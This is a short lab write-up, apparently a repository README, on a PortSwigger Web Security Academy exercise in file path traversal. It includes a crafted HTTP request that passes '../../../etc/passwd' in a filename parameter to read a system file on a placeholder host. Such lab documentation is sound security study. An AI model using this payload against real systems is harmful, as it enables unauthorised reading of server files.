# web-security-labs
Documented hands-on labs from PortSwigger and OWASP Top 10

I used Burp Suite to intercept and modify the vulnerable filename parameter. After sending a crafted request using directory traversal (../../../etc/passwd), the response confirmed the vulnerability.

## File Path Traversal - Simple Case

**Source:** PortSwigger Web Security Academy

**Completed:** June 17, 2025

**Tools Used:** Burp Suite Community Edition, Firefox

### Goal
Access '/etc/passwd' by manipulating the file path.

### Payload
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
